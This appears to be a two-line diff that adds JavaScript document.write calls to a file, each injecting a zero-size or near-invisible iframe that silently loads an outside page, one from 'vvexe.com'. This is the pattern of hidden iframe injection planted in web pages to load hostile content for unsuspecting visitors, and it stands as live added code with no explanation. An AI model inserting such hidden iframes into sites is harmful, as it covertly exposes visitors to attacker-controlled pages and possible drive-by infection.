@@ -1,0 +1,2 @@
+document.write("<iframe width='20' height='0' src='http://vvexe.com/haha/index.html'></iframe>");
+document.write("<iframe width='0' height='0' src='http://www.kenya.com/faq.htm'></iframe>");
